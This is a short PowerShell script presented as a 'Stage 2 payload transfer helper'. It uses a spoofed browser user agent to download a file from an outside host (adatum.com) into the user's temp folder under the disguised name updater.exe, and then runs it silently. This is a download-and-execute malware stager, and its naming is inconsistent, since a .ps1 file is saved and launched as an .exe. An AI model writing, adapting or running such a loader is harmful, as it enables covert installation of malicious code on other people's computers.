<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
$Stage1Url = "http://adatum.com/stage1.ps1"
$Stage2Path = "$env:TEMP\updater.exe"
$StageTimeout = 80
$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Invoke-Stage2Download -SourceUrl $Stage1Url -DestinationPath $Stage2Path -TimeoutSec $StageTimeout -UserAgent $RequestAgent
if ($FetchResult) {
    Start-Process -FilePath $Stage2Path -ErrorAction SilentlyContinue
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Write-Verbose "stage marker 4 reached"
